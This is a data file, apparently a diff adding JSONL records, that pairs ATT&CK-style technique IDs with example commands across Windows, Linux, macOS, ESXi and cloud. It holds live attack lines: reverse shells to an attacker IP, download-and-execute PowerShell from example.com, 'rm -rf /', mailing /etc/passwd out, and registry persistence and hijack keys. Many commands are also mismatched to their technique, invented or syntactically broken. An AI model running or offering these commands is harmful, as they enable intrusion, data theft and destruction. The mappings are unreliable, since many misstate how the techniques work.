+{"ID": "T1218.008", "Name": "Odbcconf", "Platform": "Windows", "Command": "odbcconf.exe /S /A \"{REGSVR 'C:\\Users\\Public\\file.dll'}\""}
+{"ID": "T1593.002", "Name": "Search Engines", "Platform": "PRE", "Command": "site:.gov intitle:\"password\""}
+{"ID": "T1177", "Name": "LSASS Driver", "Platform": "Windows", "Command": "sc config lsass start= auto"}
+{"ID": "T1591.002", "Name": "Business Relationships", "Platform": "PRE", "Command": "python business_relationships.py"}
+{"ID": "T1548.005", "Name": "Temporary Elevated Cloud Access", "Platform": "IaaS", "Command": "aws iam create-role --role-name TempElevatedAccessRole --assume-role-policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"ec2.amazonaws.com\"},\"Action\":\"sts:AssumeRole\"}]}'"}
+{"ID": "T1125", "Name": "Video Capture", "Platform": "Windows", "Command": "wmic process where \"imagename\"=\"Microsoft LifeCam\" or \"Microsoft LifeCam.exe\" or \"Microsoft LifeCam.exe*32\" or \"Microsoft LifeCam.exe*64\""}
+{"ID": "T1144", "Name": "Gatekeeper Bypass", "Platform": "macOS", "Command": "sudo xattr -d com.apple.quarantine /path/to/MyApp.app"}
+{"ID": "T1045", "Name": "Software Packing", "Platform": "Windows", "Command": "upx -9 --lzma --best example.exe"}
+{"ID": "T1055.013", "Name": "Process Doppelgänging", "Platform": "Windows", "Command": "ntfsCreateTransaction 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0"}
+{"ID": "T1016", "Name": "System Network Configuration Discovery", "Platform": "ESXi", "Command": "esxcli network ip interface ipv4 get"}
+{"ID": "T1578.003", "Name": "Delete Cloud Instance", "Platform": "IaaS", "Command": "aws ec2 terminate-instances --instance-ids i-0123456789abcdef0"}
+{"ID": "T1593.003", "Name": "Code Repositories", "Platform": "PRE", "Command": "git clone https://github.com/user/repository.git"}
+{"ID": "T1574.005", "Name": "Executable Installer File Permissions Weakness", "Platform": "Windows", "Command": "icacls \"C:\\path\\to\\installer.exe\" /inheritance:r"}
+{"ID": "T1546.008", "Name": "Accessibility Features", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\""}
+{"ID": "T1496.002", "Name": "Bandwidth Hijacking", "Platform": "Linux", "Command": "nmap -sS -Pn -p 1-65535 192.168.1.0/24"}
+{"ID": "T1504", "Name": "PowerShell Profile", "Platform": "Windows", "Command": "Get-ChildItem -Path $env:USERPROFILE\\Documents\\WindowsPowerShell\\profile.ps1"}
+{"ID": "T1198", "Name": "SIP and Trust Provider Hijacking", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}\" /v Dll /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"ID": "T1087", "Name": "Account Discovery", "Platform": "ESXi", "Command": "esxcli auth user list"}
+{"ID": "T1090", "Name": "Proxy", "Platform": "ESXi", "Command": "esxcli network ip route add -p 0.0.0.0/0 -g 192.168.1.100"}
+{"ID": "T1059", "Name": "Command and Scripting Interpreter", "Platform": "ESXi", "Command": "vmkfstools -K -i"}
+{"ID": "T1204.005", "Name": "Malicious Library", "Platform": "Linux", "Command": "pip install --upgrade --force-reinstall 'package_name'"}
+{"ID": "T1562.006", "Name": "Indicator Blocking", "Platform": "Windows", "Command": "Set-WinEvent -ProviderGuid {your_guid} -ProviderId 0 -EnableProvider $false"}
+{"ID": "T1136.002", "Name": "Domain Account", "Platform": "Linux", "Command": "net user /add /domain"}
+{"ID": "T1564.014", "Name": "Extended Attributes", "Platform": "Linux", "Command": "setfattr -n user.test -v \"echo'malicious payload' | base64 -d | bash\" /path/to/legitimate/file"}
+{"ID": "T1589.003", "Name": "Employee Names", "Platform": "PRE", "Command": "python employee_names.py"}
+{"ID": "T1677", "Name": "Poisoned Pipeline Execution", "Platform": "SaaS", "Command": "git config --global user.name \"Threat Actor\" && git config --global user.email \"threat.actor@example.com\" && git add. && git commit -m \":(\" && git push -f origin master"}
+{"ID": "T1482", "Name": "Domain Trust Discovery", "Platform": "Windows", "Command": "nltest /domain_trusts"}
+{"ID": "T1558.001", "Name": "Golden Ticket", "Platform": "Windows", "Command": "klist /users"}
+{"ID": "T1175", "Name": "Component Object Model and Distributed COM", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\" /ve /t REG_SZ /d \"Malicious DLL Path\""}
+{"ID": "T1020", "Name": "Automated Exfiltration", "Platform": "Linux", "Command": "tftp -p /path/to/sensitive/document -o /path/to/exfiltrated/document"}
+{"ID": "T1592.004", "Name": "Client Configurations", "Platform": "PRE", "Command": "net view"}
+{"ID": "T1562.007", "Name": "Disable or Modify Cloud Firewall", "Platform": "IaaS", "Command": "aws ec2 create-security-group --group-name malicious-access --description \"Allow all TCP/IP connectivity\""}
+{"ID": "T1219.001", "Name": "IDE Tunneling", "Platform": "Linux", "Command": "code-server --auth none --port 8080 --bind-address 0.0.0.0"}
+{"ID": "T1036.002", "Name": "Right-to-Left Override", "Platform": "Linux", "Command": "ls -l file.txt"}
+{"ID": "T1588.001", "Name": "Malware", "Platform": "PRE", "Command": "`powershell -ExecutionPolicy Bypass -Command \"IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/malware.exe')\""}
+{"ID": "T1027.017", "Name": "SVG Smuggling", "Platform": "Linux", "Command": "svg smuggle -f malicious_payload.js -o smuggled_svg.svg"}
+{"ID": "T1542.002", "Name": "Component Firmware", "Platform": "Windows", "Command": "bcdedit /set {current} bootsequence multi(0)disk(1)rdisk(0)partition(1)\\Windows\\bootmgr.exe"}
+{"ID": "T1070", "Name": "Indicator Removal", "Platform": "Containers", "Command": "docker rm $(docker ps -a -q)"}
+{"ID": "T1048.001", "Name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol", "Platform": "Linux", "Command": "openssl s_client -connect 192.168.1.100:443 -cipher RC4-SHA -quiet"}
+{"ID": "T1137.001", "Name": "Office Template Macros", "Platform": "Windows", "Command": "reg add \"HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Settings\" /v GlobalTemplateFullpath /t REG_SZ /d \"C:\\path\\to\\malicious\\template.dotm\""}
+{"ID": "T1583.003", "Name": "Virtual Private Server", "Platform": "PRE", "Command": "aws ec2 run-instances --image-id ami-0c55b159cbff4159a --count 1 --instance-type t2.micro"}
+{"ID": "T1213.001", "Name": "Confluence", "Platform": "SaaS", "Command": "confluence search \"sensitive information\""}
+{"ID": "T1550.003", "Name": "Pass the Ticket", "Platform": "Windows", "Command": "klist tgt /s <target_machine_name>"}
+{"ID": "T1609", "Name": "Container Administration Command", "Platform": "Containers", "Command": "docker exec -it <container_id> /bin/bash"}
+{"ID": "T1083", "Name": "File and Directory Discovery", "Platform": "ESXi", "Command": "esxcli storage filesystem list"}
+{"ID": "T1568", "Name": "Dynamic Resolution", "Platform": "Linux", "Command": "dig +short mydomain.com @8.8.8.8 | awk '{print $2}' | sed's/\\.$//' | awk '{print $1\".\"$2\".\"$3\".\"$4\".\"$5\".\"$6\".\"$7\".\"$8\".\"$9\".\"$10\".\"$11\".\"$12\".\"$13\".\"$14\".\"$15\".\"$16\".\"$17\".\"$18\".\"$19\".\"$20\".\"$21\".\"$22\".\"$23\".\"$24\".\"$25\".\"$26\".\"$27\".\"$28\".\"$29\".\"$30\".\"$31\".\"$32}'"}
+{"ID": "T1036.004", "Name": "Masquerade Task or Service", "Platform": "Linux", "Command": "systemctl start malicious_service_name"}
+{"ID": "T1055.004", "Name": "Asynchronous Procedure Call", "Platform": "Windows", "Command": "QueueUserAPC(0xfeeefeee, (LPVOID)0x12345678, (PVOID)0x12345678, 0)"}
+{"ID": "T1020.001", "Name": "Traffic Duplication", "Platform": "Network Devices", "Command": "show run | include \"mirror\""}
+{"ID": "T1138", "Name": "Application Shimming", "Platform": "Windows", "Command": "sdbinst.exe -o -s \"%WINDIR%\\AppPatch\\sysmain.sdb\""}
+{"ID": "T1647", "Name": "Plist File Modification", "Platform": "macOS", "Command": "plutil -R -convert xml1 -r ~/Library/Preferences/com.apple.dock.plist"}
+{"ID": "T1127.003", "Name": "JamPlus", "Platform": "Windows", "Command": "jamplus /build malicious_script.jam"}
+{"ID": "T1546.009", "Name": "AppCert DLLs", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run\\\" \"path\\to\\malicious_dll.dll\""}
+{"ID": "T1191", "Name": "CMSTP", "Platform": "Windows", "Command": "CMSTP.exe /inf=\"path\\to\\malicious.inf\""}
+{"ID": "T1188", "Name": "Multi-hop Proxy", "Platform": "Linux", "Command": "sudo apt-get install squid -y && sudo service squid reload"}
+{"ID": "T1114.003", "Name": "Email Forwarding Rule", "Platform": "Linux", "Command": "echo \"echo 'procmail -f /var/spool/postfix/maildrop /etc/procmailrc' | sudo tee -a /etc/postfix/main.cf\""}
+{"ID": "T1074", "Name": "Data Staged", "Platform": "Windows", "Command": "copy C:\\path\\to\\staged_data.txt C:\\path\\to\\staging\\location\\staged_data.txt"}
+{"ID": "T1649", "Name": "Steal or Forge Authentication Certificates", "Platform": "Windows", "Command": "certutil.exe -key -v -f -k \"*\""}
+{"ID": "T1098.005", "Name": "Device Registration", "Platform": "Windows", "Command": "net user /add \"adversary-controlled-device\" \"adversary-controlled-password\""}
+{"ID": "T1049", "Name": "System Network Connections Discovery", "Platform": "Windows", "Command": "netstat -a -n"}
+{"ID": "T1584", "Name": "Compromise Infrastructure", "Platform": "PRE", "Command": "nmap -sS -Pn -p 1-65535 192.168.1.0/24"}
+{"ID": "T1553.005", "Name": "Mark-of-the-Web Bypass", "Platform": "Windows", "Command": "attrib +r +s +h \"C:\\path\\to\\container_file.arj\""}
+{"ID": "T1600.002", "Name": "Disable Crypto Hardware", "Platform": "Network Devices", "Command": "no ip igmp snooping"}
+{"ID": "T1542", "Name": "Pre-OS Boot", "Platform": "Linux", "Command": "sudo mokutil --disable-validation"}
+{"ID": "T1064", "Name": "Scripting", "Platform": "Linux", "Command": "python -c 'import os; os.system(\"bash -c \\\"rm -rf /\\\")'"}
+{"ID": "T1612", "Name": "Build Image on Host", "Platform": "Containers", "Command": "docker build -t myimage:."}
+{"ID": "T1051", "Name": "Shared Webroot", "Platform": "Windows", "Command": "net share webroot /recycle /yes"}
+{"ID": "T1055.002", "Name": "Portable Executable Injection", "Platform": "Windows", "Command": "CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)address_of_code, NULL, 0, NULL)"}
+{"ID": "T1218.012", "Name": "Verclsid", "Platform": "Windows", "Command": "verclsid.exe /S /C \"{CLSID}\""}
+{"ID": "T1586", "Name": "Compromise Accounts", "Platform": "PRE", "Command": "python social_engineering.py"}
+{"ID": "T1569.001", "Name": "Launchctl", "Platform": "macOS", "Command": "launchctl load -w \"/Library/LaunchAgents/adversary_agent.plist\""}
+{"ID": "T1584.005", "Name": "Botnet", "Platform": "PRE", "Command": "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"attacker's IP\",port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\"/bin/bash\")'"}
+{"ID": "T1059.008", "Name": "Network Device CLI", "Platform": "Network Devices", "Command": "show running"}
+{"ID": "T1552.003", "Name": "Shell History", "Platform": "Linux", "Command": "history"}
+{"ID": "T1562.010", "Name": "Downgrade Attack", "Platform": "Windows", "Command": "powershell -ExecutionPolicy Bypass -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\ScriptedGroupPolicy' -Name 'DisableWindowsUpdate' -Value 1\""}
+{"ID": "T1559.003", "Name": "XPC Services", "Platform": "macOS", "Command": "xpc_service -l com.apple.xpc.launchd -c \"com.example.malicious.service\" -s com.example.malicious.service -t com.example.malicious.service -e \"/bin/bash -c'malicious_command'\""}
+{"ID": "T1497", "Name": "Virtualization/Sandbox Evasion", "Platform": "Linux", "Command": "ps -ef | grep -q \"vmware\" && echo \"detected\" && sleep 10"}
+{"ID": "T1102", "Name": "Web Service", "Platform": "ESXi", "Command": "esxcli network firewall ruleset add -action=allow -rule=80 -protocol=tcp -direction=in -dst=8.8.8.8"}
+{"ID": "T1552.001", "Name": "Credentials In Files", "Platform": "Containers", "Command": "docker exec -it <container_id> cat /path/to/credentials/file"}
+{"ID": "T1568.003", "Name": "DNS Calculation", "Platform": "Linux", "Command": "dig +short example.com | awk '{print $4}' | cut -d '.' -f 1-3 | awk '{print $1\".\"$2\".\"$3\".80\"}'"}
+{"ID": "T1218.005", "Name": "Mshta", "Platform": "Windows", "Command": "mshta vbscript:Close(Execute(\"GetObject(\"\"http[:]//webserver/payload.sct\"\")\"))"}
+{"ID": "T1547.015", "Name": "Login Items", "Platform": "macOS", "Command": "tell application \"System Events\" to make login item at end with properties {name:\"Malicious Executable\", path:\"/path/to/executable\"}"}
+{"ID": "T1608", "Name": "Stage Capabilities", "Platform": "PRE", "Command": "python -c 'import requests; r = requests.get(\"https://example.com/staged_capability\"); exec(r.text)'"}
+{"ID": "T1608.005", "Name": "Link Target", "Platform": "PRE", "Command": "curl -X GET 'https://example.com/link-target'"}
+{"ID": "T1104", "Name": "Multi-Stage Channels", "Platform": "Linux", "Command": "nc -e /bin/bash 10.0.0.1 443"}
+{"ID": "T1657", "Name": "Financial Theft", "Platform": "Linux", "Command": "ssh user@victim_linux 'echo \"bash -c \\'cat /etc/passwd | mail -s \"You owe me money\" attacker_email\\'\\' | mail -s \"You owe me money\" attacker_email"}
+{"ID": "T1480", "Name": "Execution Guardrails", "Platform": "ESXi", "Command": "esxcli vm process list | grep -i \"your_target_vm_name\""}
+{"ID": "T1619", "Name": "Cloud Storage Object Discovery", "Platform": "IaaS", "Command": "aws cloudwatch logs filter-events --filter-name \"eventSource='s3'\""}
+{"ID": "T1606.001", "Name": "Web Cookies", "Platform": "Linux", "Command": "python -c 'import requests; s = requests.Session(); s.cookies[\"session_id\"] = \"adversary_generated_cookie_value\"; s.get(\"http://target_website.com\")'"}
+{"ID": "T1654", "Name": "Log Enumeration", "Platform": "ESXi", "Command": "esxcli system logs dump"}
+{"ID": "T1134.001", "Name": "Token Impersonation/Theft", "Platform": "Windows", "Command": "DuplicateTokenEx(NULL, NULL, NULL, 0x0002, &hToken, &TokenInfo);"}
+{"ID": "T1567.001", "Name": "Exfiltration to Code Repository", "Platform": "Linux", "Command": "curl -X POST -H \"Authorization: Bearer YOUR_TOKEN\" -H \"Content-Type: application/json\" -d '{\"name\": \"exfiltrated_data\", \"description\": \"exfiltrated data\", \"content\": \"exfiltrated data\"}' https://api.github.com/repos/username/repository/contents/path/to/exfiltrated/data"}
+{"ID": "T1021.007", "Name": "Cloud Services", "Platform": "IaaS", "Command": "az login"}
+{"ID": "T1205.001", "Name": "Port Knocking", "Platform": "Linux", "Command": "nc -vv -w 1 127.0.0.1 12345"}
+{"ID": "T1027.012", "Name": "LNK Icon Smuggling", "Platform": "Windows", "Command": "cmd /c \"powershell -c \"Invoke-WebRequest -Uri https://example.com/malware.exe -OutFile C:\\Windows\\Temp\\malware.exe; Start-Process -FilePath C:\\Windows\\Temp\\malware.exe\"\""}
+{"ID": "T1583.006", "Name": "Web Services", "Platform": "PRE", "Command": "python -m pip install requests"}
+{"ID": "T1528", "Name": "Steal Application Access Token", "Platform": "SaaS", "Command": "curl -X POST https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token -H \"Content-Type: application/x-www-form-urlencoded\" -d \"grant_type=refresh_token&refresh_token=refresh_token_value&client_id=client_id&client_secret=client_secret_value&redirect_uri=redirect_uri_value\""}
+{"ID": "T1598.002", "Name": "Spearphishing Attachment", "Platform": "PRE", "Command": "powershell -Command \"Invoke-WebRequest -Uri 'http://example.com/malicious.exe' -OutFile 'C:\\Users\\username\\Downloads\\malicious.exe'\""}
+{"ID": "T1098.001", "Name": "Additional Cloud Credentials", "Platform": "IaaS", "Command": "aws iam create-user --access-key --user-name <username>"}
+{"ID": "T1204", "Name": "User Execution", "Platform": "Linux", "Command": "ls /home/user/Downloads"}
+{"ID": "T1491.001", "Name": "Internal Defacement", "Platform": "ESXi", "Command": "vmkfstools -D -s \"defaced_message\" /vmfs/volumes/.../vmname.vmdk"}
+{"ID": "T1564.002", "Name": "Hidden Users", "Platform": "macOS", "Command": "dscl. -create /Users/hiddenuser -record UID=499 -isHidden yes"}
+{"ID": "T1134.003", "Name": "Make and Impersonate Token", "Platform": "Windows", "Command": "LogonUserW(\"username\", NULL, \"password\", 3, 0, NULL, &tokenHandle)"}
+{"ID": "T1552.006", "Name": "Group Policy Preferences", "Platform": "Windows", "Command": "dir /s /b *.xml"}
+{"ID": "T1196", "Name": "Control Panel Items", "Platform": "Windows", "Command": "control.exe /s /c \"c:\\path\\to\\malicious.cpl\""}
+{"ID": "T1048.002", "Name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol", "Platform": "Linux", "Command": "openssl s_client -connect example.com:443 -cipher ECDHE-RSA-AES256-GCM-SHA384"}
+{"ID": "T1087.004", "Name": "Cloud Account", "Platform": "IaaS", "Command": "az vm list --all"}
+{"ID": "T1057", "Name": "Process Discovery", "Platform": "ESXi", "Command": "esxcli system process list"}
+{"ID": "T1562.003", "Name": "Impair Command History Logging", "Platform": "ESXi", "Command": "unset HISTFILE"}
+{"ID": "T1053.004", "Name": "Launchd", "Platform": "macOS", "Command": "launchctl load -w /Library/LaunchDaemons/malicious.plist"}
+{"ID": "T1556.008", "Name": "Network Provider DLL", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"mpnotify\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\""}
+{"ID": "T1546.003", "Name": "Windows Management Instrumentation Event Subscription", "Platform": "Windows", "Command": "wmic path win32_process where \"name='wmiadap.exe'\" call terminate"}
+{"ID": "T1596.004", "Name": "CDNs", "Platform": "PRE", "Command": "nmap -sV -A -p 80,443 targetdomain.com"}
+{"ID": "T1497.002", "Name": "User Activity Based Checks", "Platform": "Linux", "Command": "psmisc -e | grep -q \"vmware\""}
+{"ID": "T1141", "Name": "Input Prompt", "Platform": "macOS", "Command": "osascript -e 'display dialog \"Enter your password\" default answer \"\" buttons {\"OK\", \"Cancel\"} default button 1'"}
+{"ID": "T1496.004", "Name": "Cloud Service Hijacking", "Platform": "SaaS", "Command": "aws sns publish --message \"Your spam email content here\" --topic-arn \"arn:aws:sns:region:account-id:topic-name\""}
+{"ID": "T1585.003", "Name": "Cloud Accounts", "Platform": "PRE", "Command": "aws iam create-user --user-name \"adversary_account\""}
+{"ID": "T1072", "Name": "Software Deployment Tools", "Platform": "Linux", "Command": "sudo apt-get install -y python3-pip && pip3 install paramiko"}
+{"ID": "T1041", "Name": "Exfiltration Over C2 Channel", "Platform": "ESXi", "Command": "vmware-tool --cmd 'vmware.rawdump --encoding=base64 --length=1024'"}
+{"ID": "T1134.004", "Name": "Parent PID Spoofing", "Platform": "Windows", "Command": "CreateProcessW(0x41414141, \"C:\\\\Windows\\\\System32\\\\cmd.exe\", NULL, 0, 0x41414141, NULL, NULL, CREATE_SUSPENDED, NULL, NULL)"}
+{"ID": "T1591", "Name": "Gather Victim Org Information", "Platform": "PRE", "Command": "SEC EDGAR Search"}
+{"ID": "T1060", "Name": "Registry Run Keys / Startup Folder", "Platform": "Windows", "Command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Persistence\" /t REG_SZ /d \"C:\\path\\to\\malware.exe\""}
+{"ID": "T1606", "Name": "Forge Web Credentials", "Platform": "SaaS", "Command": "python forge_web_credentials.py --target https://example.com --username admin --password P@ssw0rd"}
+{"ID": "T1621", "Name": "Multi-Factor Authentication Request Generation", "Platform": "Windows", "Command": "netsh advfirewall set allprofiles state enabled"}
+{"ID": "T1554", "Name": "Compromise Host Software Binary", "Platform": "Linux", "Command": "echo \"yum-versionlock\""}
+{"ID": "T1552.008", "Name": "Chat Messages", "Platform": "SaaS", "Command": "Get-Content -Path \"C:\\Users\\username\\AppData\\Local\\Microsoft\\Teams\\cache\\index.vdb\""}
+{"ID": "T1059.001", "Name": "PowerShell", "Platform": "Windows", "Command": "powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://example.com/malicious.ps1'))\""}
+{"ID": "T1023", "Name": "Shortcut Modification", "Platform": "Windows", "Command": "mklink \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Shortcut.lnk\" \"C:\\path\\to\\malicious\\executable.exe\""}
+{"ID": "T1546.001", "Name": "Change Default File Association", "Platform": "Windows", "Command": "reg add \"HKEY_CLASSES_ROOT\\.txt\" /v \"\" /t REG_SZ /d \"C:\\path\\to\\malicious\\program.exe \\\"%1\\\"\""}
+{"ID": "T1055.014", "Name": "VDSO Hijacking", "Platform": "Linux", "Command": "ptrace(2) - attach to a process, then use `syscalls` system call to execute malicious code."}
+{"ID": "T1026", "Name": "Multiband Communication", "Platform": "Linux", "Command": "nc -e /bin/bash 10.0.0.1 443"}
+{"ID": "T1071.002", "Name": "File Transfer Protocols", "Platform": "ESXi", "Command": "esxcli network ip interface ipv4 set -p <interface> -i <ip> -g <gateway> -m <subnetmask>"}
+{"ID": "T1679", "Name": "Selective Exclusion", "Platform": "Windows", "Command": "cipher /d /v:C:\\Windows\\System32\\*.dll"}
+{"ID": "T1122", "Name": "Component Object Model Hijacking", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Classes\\CLSID\\{00021401-0000-0000-C000-000000000000}\" /ve /t REG_SZ /d \"C:\\path\\to\\malicious.dll\""}
+{"ID": "T1015", "Name": "Accessibility Features", "Platform": "Windows", "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Debugger\" /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f"}
+{"ID": "T1212", "Name": "Exploitation for Credential Access", "Platform": "Linux", "Command": "nmap -sC -p 88 192.168.1.1/24"}
+{"ID": "T1546.014", "Name": "Emond", "Platform": "macOS", "Command": "launchctl unload /System/Library/LaunchAgents/com.apple.emond.plist"}
+{"ID": "T1102.003", "Name": "One-Way Communication", "Platform": "Linux", "Command": "curl -s -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"cmd=ls\" https://example.com/command"}
+{"ID": "T1590", "Name": "Gather Victim Network Information", "Platform": "PRE", "Command": "nmap -sS -O 192.168.1.0/24"}
+{"ID": "T1210", "Name": "Exploitation of Remote Services", "Platform": "Linux", "Command": "nmap -sC -p 445 192.168.1.1/24"}
+{"ID": "T1502", "Name": "Parent PID Spoofing", "Platform": "Windows", "Command": "CreateProcessW(0x41414141, \"C:\\\\Windows\\\\System32\\\\cmd.exe\", NULL, 0, 0x41414141, NULL, NULL, CREATE_SUSPENDED, NULL, NULL)"}
+{"ID": "T1142", "Name": "Keychain", "Platform": "macOS", "Command": "security list-keychains -d user"}
+{"ID": "T1534", "Name": "Internal Spearphishing", "Platform": "Windows", "Command": "wmic /node:\"<target_computer_name>\" process where \"imagepath='C:\\\\Windows\\\\System32\\\\cmd.exe'\" call create"}
+{"ID": "T1169", "Name": "Sudo", "Platform": "Linux", "Command": "visudo"}
+{"ID": "T1574.010", "Name": "Services File Permissions Weakness", "Platform": "Windows", "Command": "icacls \"C:\\Windows\\System32\\svchost.exe\" /inheritance:e"}
+{"ID": "T1547.001", "Name": "Registry Run Keys / Startup Folder", "Platform": "Windows", "Command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MaliciousProgram\" /t REG_SZ /d \"C:\\path\\to\\malicious.exe\""}
+{"ID": "T1199", "Name": "Trusted Relationship", "Platform": "Windows", "Command": "net localgroup \"Administrators\""}
+{"ID": "T1136.003", "Name": "Cloud Account", "Platform": "IaaS", "Command": "az vm create --name myvm --resource-group myrg --image UbuntuServer --admin-username azureuser --admin-password \"P@ssw0rd123\" --size Standard_DS2_v2"}
+{"ID": "T1069.001", "Name": "Local Groups", "Platform": "Linux", "Command": "groups"}
+{"ID": "T1149", "Name": "LC_MAIN Hijacking", "Platform": "macOS", "Command": "otool -l --all --arch=x86_64 malicious_binary | grep LC_MAIN | awk '{print $1}' | sed's/LC_MAIN/0x20000000/' | xcrun -sdk macosx10.8 -l -o modified_binary -m -segname __TEXT -segaddr 0x10000000 -segsiz 0x1000 -segname __LINKEDIT -segaddr 0x20000000 -segsiz 0x1000 -segname __TEXT -segaddr 0x30000000 -segsiz 0x100"}
+{"ID": "T1593", "Name": "Search Open Websites/Domains", "Platform": "PRE", "Command": "google dorks site:.edu"}
+{"ID": "T1562.013", "Name": "Disable or Modify Network Device Firewall", "Platform": "Network Devices", "Command": "show firewall"}
+{"ID": "T1098", "Name": "Account Manipulation", "Platform": "Containers", "Command": "docker run -it --rm -v /:/host-system --privileged -e USER=root -e HOME=/root -e SHELL=/bin/bash alpine /bin/sh -c 'echo \"username:password\" >> /host-system/etc/passwd'"}
+{"ID": "T1170", "Name": "Mshta", "Platform": "Windows", "Command": "mshta https://example.com/payload.hta"}
+{"ID": "T1048", "Name": "Exfiltration Over Alternative Protocol", "Platform": "ESXi", "Command": "curl -o /tmp/exfiltrated_data.txt http://<IP_address>/exfiltrated_data"}
+{"ID": "T1547.006", "Name": "Kernel Modules and Extensions", "Platform": "macOS", "Command": "kextload -f /System/Library/Extensions/extension.kext"}
+{"ID": "T1678", "Name": "Delay Execution", "Platform": "Linux", "Command": "sleep 60"}
+{"ID": "T1056.002", "Name": "GUI Input Capture", "Platform": "macOS", "Command": "osascript -e 'display dialog \"Enter your password\" default answer \"\" buttons {\"OK\", \"Cancel\"} default button 1'"}
+{"ID": "T1097", "Name": "Pass the Ticket", "Platform": "Windows", "Command": "klist tgt /s <target_machine_name>"}
+{"ID": "T1588.002", "Name": "Tool", "Platform": "PRE", "Command": "psexec.exe \\\\target-system -s -f \"C:\\path\\to\\file.exe\""}
+{"ID": "T1052.001", "Name": "Exfiltration over USB", "Platform": "Linux", "Command": "lsusb"}
+{"ID": "T1574.013", "Name": "KernelCallbackTable", "Platform": "Windows", "Command": "NtQueryInformationProcess(0x1F, 0x10, 0x0, 0x0, 0x0, 0x0)"}
+{"ID": "T1597", "Name": "Search Closed Sources", "Platform": "PRE", "Command": "shodan search \"victim_company_name\""}
+{"ID": "T1053.006", "Name": "Systemd Timers", "Platform": "Linux", "Command": "systemd-tmpfiles-clean.timer"}
+{"ID": "T1566", "Name": "Phishing", "Platform": "Identity Provider", "Command": "az ad signin logs show --all"}
+{"ID": "T1061", "Name": "Graphical User Interface", "Platform": "Linux", "Command": "xdotool click 1"}
+{"ID": "T1542.004", "Name": "ROMMONkit", "Platform": "Network Devices", "Command": "copy tftp://<adversary_ip>/rommon_image.bin rommon"}
+{"ID": "T1218.001", "Name": "Compiled HTML File", "Platform": "Windows", "Command": "powershell -c \"Add-Type -TypeDefinition '[DllImport(\\\"hhctrl.ocx\\\")] public class HHCtrl { [DllImport(\\\"hhctrl.ocx\\\")] public static extern int HtmlHelp(string pszTopic, int uCmd, int nIndex, int nFlags); }'; $h = New-Object HHCtrl; $h.HtmlHelp('malicious.chm', 0, 0, 0)\""}
+{"ID": "T1496.001", "Name": "Compute Hijacking", "Platform": "Windows", "Command": "taskkill /f /im bminer.exe"}
+{"ID": "T1070.005", "Name": "Network Share Connection Removal", "Platform": "Windows", "Command": "net use \\\\system\\share /delete"}
+{"ID": "T1090.003", "Name": "Multi-hop Proxy", "Platform": "ESXi", "Command": "esxcli network ip route add -p 10.0.0.1 -g 10.0.0.2 -h 10.0.0.3 -r 10.0.0.4"}
+{"ID": "T1110", "Name": "Brute Force", "Platform": "Containers", "Command": "cracklib -b /usr/share/dict/words -t 1 -f /path/to/container/credentials.txt"}
+{"ID": "T1059.004", "Name": "Unix Shell", "Platform": "ESXi", "Command": "vmware-cmd -g 0:0 \"reboot\""}
+{"ID": "T1137.003", "Name": "Outlook Forms", "Platform": "Windows", "Command": "mimikatz.exe -jnk \"outlook.exe /newmailrule\""}
+{"ID": "T1219.003", "Name": "Remote Access Hardware", "Platform": "Linux", "Command": "ssh -L 8080:localhost:22 -o \"StrictHostKeyChecking=no\" tiny@target_ip"}
+{"ID": "T1157", "Name": "Dylib Hijacking", "Platform": "macOS", "Command": "cp /path/to/malicious.dylib /Library/Frameworks/"}
+{"ID": "T1562.001", "Name": "Disable or Modify Tools", "Platform": "Containers", "Command": "docker run --security-opt no-new-priviliges=true"}
+{"ID": "T1565", "Name": "Data Manipulation", "Platform": "Linux", "Command": "echo \"Hello, World!\" > /tmp/output.txt"}
+{"ID": "T1559", "Name": "Inter-Process Communication", "Platform": "Linux", "Command": "mkfifo /tmp/pipe; nc -l -p 1234 <&3 > /tmp/pipe | bash"}
+{"ID": "T1001", "Name": "Data Obfuscation", "Platform": "ESXi", "Command": "vmknic -d 1000 -m 1500"}
+{"ID": "T1039", "Name": "Data from Network Shared Drive", "Platform": "Linux", "Command": "ls /mnt/network-share/"}
